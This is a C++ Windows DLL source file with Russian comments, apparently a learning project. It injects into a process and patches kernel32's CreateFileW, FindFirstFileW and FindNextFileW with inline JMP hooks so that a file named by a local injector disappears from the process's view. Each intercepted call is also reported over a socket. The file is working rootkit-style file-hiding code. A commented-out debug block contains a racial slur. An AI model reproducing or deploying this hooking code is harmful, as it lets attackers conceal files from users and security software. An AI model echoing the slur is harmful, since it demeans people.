// dllmain.cpp : Определяет точку входа для приложения DLL.
#include "framework.h"
#include <stdio.h>
#define MAGIC 14



#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>

// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "27015"

char func_name[256] = "";
char file_name[256] = "";
SOCKET ConnectSocket = INVALID_SOCKET;

BYTE CreateOrigBytes[MAGIC];
BYTE FirstOrigBytes[MAGIC];
BYTE NextOrigBytes[MAGIC];

BYTE bytesCreate[14] = {
    0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, // JMP [RIP+0]
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 // Сюда ляжет 64-битный адрес
};
BYTE bytesFirst[14] = {
    0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, // JMP [RIP+0]
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 // Сюда ляжет 64-битный адрес
};
BYTE bytesNext[14] = {
    0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, // JMP [RIP+0]
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 // Сюда ляжет 64-битный адрес
};

wchar_t* convertCharArrayToLPCWSTR(const char* charArray)
{
    wchar_t* wString = new wchar_t[4096];
    MultiByteToWideChar(CP_ACP, 0, charArray, -1, wString, 4096);
    return wString;
}

int connect_to_server()
{

    FILE* file2;
    fopen_s(&file2, "C:/Users/magar/Desktop/1000101/client_log.txt", "w");

    WSADATA wsaData;
    //SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo* result = NULL,
        * ptr = NULL,
        hints;
    const char* sendbuf = "this is a test";
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        fprintf(file2, "WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo("127.0.0.1", DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    // Attempt to connect to an address until one succeeds
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            fprintf(file2, "socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return 1;
        }

        // Connect to server.
        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }
    freeaddrinfo(result);
    if (ConnectSocket == INVALID_SOCKET) {
        fprintf(file2, "Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }


    
    char recv_buff[514] = "";
    iResult = recv(ConnectSocket, recv_buff, _countof(recv_buff), 0);

    int i = 0;
    while (recv_buff[i] != '-') {
        func_name[i] = recv_buff[i];
        i++;
    }
    func_name[i] = 0;
    i++;
    int j = 0;
    while (recv_buff[i + j] != 0) {
        file_name[j] = recv_buff[i + j];
        j++;
    }
    file_name[j] = 0;

    

    return 0;
    
}

HANDLE MyCreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition,
    DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) {

    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
    void* FuncAddr = (void*)GetProcAddress(hKernel32, "CreateFileW");

    // 1. ОТПРАВЛЯЕМ ДАННЫЕ О ТОМ, ЧТО ФУНКЦИЯ ВЫЗВАНА
    char notification[] = "Called function: CreateFileW\n";
    send(ConnectSocket, notification, strlen(notification) + 1, 0);

    // 2. СКРЫВАЕМ ФАЙЛ ЕСЛИ НАДО
    LPCWSTR FileToHide = convertCharArrayToLPCWSTR(file_name);
    if (wcsstr(lpFileName, FileToHide)) {
        SetLastError(ERROR_FILE_NOT_FOUND);
        return INVALID_HANDLE_VALUE; // Процесс думает, что файла нет
    }

    // 3 ВЫЗОВ ОРИГИНАЛА
    // начало оригинальной функции затерто нашими 14 байтами JMP
    // надо: Снять хук -> Вызвать оригинал -> Вернуть хук

    DWORD oldProtect;
    
    // 3.1 Снимаем наш хук (возвращаем родные 14 байт)
    VirtualProtect(FuncAddr, MAGIC, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(FuncAddr, CreateOrigBytes, MAGIC);

    // 3.2 Вызываем настоящую CreateFileW
    HANDLE result = CreateFileW(lpFileName, dwDesiredAccess, dwShareMode,
        lpSecurityAttributes, dwCreationDisposition,
        dwFlagsAndAttributes, hTemplateFile);
    
    // 3.3 Ставим хук обратно (возвращаем JMP)
    memcpy(FuncAddr, bytesCreate, MAGIC);
    VirtualProtect(FuncAddr, MAGIC, oldProtect, &oldProtect);
    
    return result;
}

HANDLE MyFindFirstFileW(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData) {

    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
    void* FuncAddr = (void*)GetProcAddress(hKernel32, "FindFirstFileW");

    // 1. ОТПРАВЛЯЕМ ДАННЫЕ О ТОМ, ЧТО ФУНКЦИЯ ВЫЗВАНА
    char notification[] = "Called function: FindFirstFileW\n";
    send(ConnectSocket, notification, strlen(notification) + 1, 0);

    // 2. СКРЫВАЕМ ФАЙЛ ЕСЛИ НАДО
    LPCWSTR FileToHide = convertCharArrayToLPCWSTR(file_name);
    if (wcsstr(lpFileName, FileToHide)) {
        SetLastError(ERROR_FILE_NOT_FOUND);
        return INVALID_HANDLE_VALUE; // Процесс думает, что файла нет
    }

    // 3 ВЫЗОВ ОРИГИНАЛА
    // начало оригинальной функции затерто нашими 14 байтами JMP
    // надо: Снять хук -> Вызвать оригинал -> Вернуть хук

    DWORD oldProtect;

    // 3.1 Снимаем наш хук (возвращаем родные 14 байт)
    VirtualProtect(FuncAddr, MAGIC, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(FuncAddr, FirstOrigBytes, MAGIC);

    // 3.2 Вызываем настоящую CreateFileW
    HANDLE result = FindFirstFileW(lpFileName, lpFindFileData);

    // 3.3 Ставим хук обратно (возвращаем JMP)
    memcpy(FuncAddr, bytesFirst, MAGIC);
    VirtualProtect(FuncAddr, MAGIC, oldProtect, &oldProtect);

    return result;
}

BOOL WINAPI MyFindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData) {

    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
    void* FuncAddr = (void*)GetProcAddress(hKernel32, "FindNextFileW");

    char notification[] = "Called function: FindNextFileW\n";
    send(ConnectSocket, notification, strlen(notification) + 1, 0);

    // 1 Снимаем хук, чтобы вызвать настоящую функцию
    DWORD oldProtect;
    VirtualProtect(FuncAddr, MAGIC, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(FuncAddr, NextOrigBytes, MAGIC);

    // 2 Вызываем оригинал (система записывает имя файла в lpFindFileData)
    BOOL result = FindNextFileW(hFindFile, lpFindFileData);

    // 3 Проверяем: это тот самый файл, который надо скрыть
    wchar_t* target = convertCharArrayToLPCWSTR(file_name);

    if (result && wcsstr(lpFindFileData->cFileName, target)) {
        // 4. Если это "скрытый" файл — вызываем функцию ЕЩЕ РАЗ
        // Теперь система запишет в lpFindFileData уже СЛЕДУЮЩИЙ файл в папке
        result = FindNextFileW(hFindFile, lpFindFileData);

        // Отправляем лог в инжектор
        send(ConnectSocket, "File hidden!\n", 15, 0);
    }

    // 5. Ставим хук обратно и возвращаем результат
    memcpy(FuncAddr, bytesNext, MAGIC);
    VirtualProtect(FuncAddr, MAGIC, oldProtect, &oldProtect);

    return result;
}


int InstallHook(const char func[256]) {

    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
    void* FuncAddr;
    DWORD oldProtect;

    if (!strcmp("CreateFileW", func)) {
        // получаем адрес
        FuncAddr = (void*)GetProcAddress(hKernel32, func);
        // сохраняем старые байты
        memcpy(CreateOrigBytes, FuncAddr, MAGIC);
        // подменяем начало функции
        *(void**)(&bytesCreate[6]) = (void*)MyCreateFileW;
        // разрешаем запись в адресное пространство функции
        VirtualProtect(FuncAddr, MAGIC, PAGE_EXECUTE_READWRITE, &oldProtect);
        // Перезаписываем начало функции нашим JMP-шаблоном
        memcpy(FuncAddr, bytesCreate, MAGIC);
        // Возвращаем права памяти как было
        VirtualProtect(FuncAddr, MAGIC, oldProtect, &oldProtect);

    }
    
    // повторения действий выше, но для других функций
    if (!strcmp("FindFirstFileW", func)) {
        FuncAddr = (void*)GetProcAddress(hKernel32, func);
        memcpy(FirstOrigBytes, FuncAddr, MAGIC);
        *(void**)(&bytesFirst[6]) = (void*)MyFindFirstFileW;
        VirtualProtect(FuncAddr, MAGIC, PAGE_EXECUTE_READWRITE, &oldProtect);
        memcpy(FuncAddr, bytesFirst, MAGIC);
        VirtualProtect(FuncAddr, MAGIC, oldProtect, &oldProtect);
    }
    if (!strcmp("FindNextFileW", func)) {
        FuncAddr = (void*)GetProcAddress(hKernel32, func);
        memcpy(NextOrigBytes, FuncAddr, MAGIC);
        *(void**)(&bytesNext[6]) = (void*)MyFindNextFileW;
        VirtualProtect(FuncAddr, MAGIC, PAGE_EXECUTE_READWRITE, &oldProtect);
        memcpy(FuncAddr, bytesNext, MAGIC);
        VirtualProtect(FuncAddr, MAGIC, oldProtect, &oldProtect);
    }
    


    return 1;
}

BOOL APIENTRY DllMain( HMODULE hModule, DWORD  reason, LPVOID lpReserved)
{
    switch (reason)
    {
    case DLL_PROCESS_ATTACH: {
        //52
        Sleep(3000);
        connect_to_server();

        InstallHook("CreateFileW");
        InstallHook("FindFirstFileW");
        InstallHook("FindNextFileW");
            

            
                /*
                FILE* file2;
                fopen_s(&file2, "C:/Users/magar/Desktop/1000101/popka.txt", "w");
                fprintf(file2, "hello niggazz11");
                fprintf(file2, "%s\n", func_name);
                fprintf(file2, "%s\n", file_name);
                fclose(file2);
                */
            
            break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;

}

